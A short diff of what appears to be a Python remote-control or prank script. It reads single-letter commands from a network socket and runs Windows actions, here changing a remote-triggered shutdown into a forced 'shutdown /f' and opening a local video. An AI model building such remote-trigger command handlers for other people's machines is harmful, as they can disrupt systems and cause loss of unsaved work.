@@ -13,7 +13,7 @@ while True:
     t = c.recv(1024).decode('utf-8')
     if platform.system() == "Windows":
         if t == 's':
-            os.system("shutdown")
+            os.system("shutdown /f")
         elif t == 'm':
             os.system("F:\\Download\\mafiaan.mp4")
         elif t == 'r':
